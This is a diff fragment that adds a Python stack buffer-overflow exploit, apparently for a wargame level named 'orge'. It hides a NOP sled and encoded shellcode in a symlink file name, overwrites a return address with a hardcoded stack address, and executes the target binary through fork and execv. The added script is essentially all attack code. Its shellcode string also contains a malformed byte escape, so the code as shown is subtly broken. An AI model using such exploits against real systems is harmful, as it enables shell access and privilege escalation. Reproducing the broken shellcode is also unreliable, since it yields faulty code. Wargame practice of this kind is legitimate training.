@@ -229,3 +229,36 @@ else:
 ```
 
 -----
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+target = "/home/orge/"
+
+shellcode = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\x\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+
+sym_link = "\x90"*50 + shellcode + "\x90"*32
+
+shellcode_addr = 0xbffffc78
+
+if os.path.exists(sym_link):
+        os.remove(sym_link)
+
+os.symlink('troll', sym_link)
+target = target + sym_link
+
+payload = "\x90"*44
+payload = append(p32(shellcode_addr))
+
+pid = os.fork()
+
+if pid == 0:
+        os.execv(target, (target, payload))
+else:
+        os.waitpid(pid, 0)
+```
+
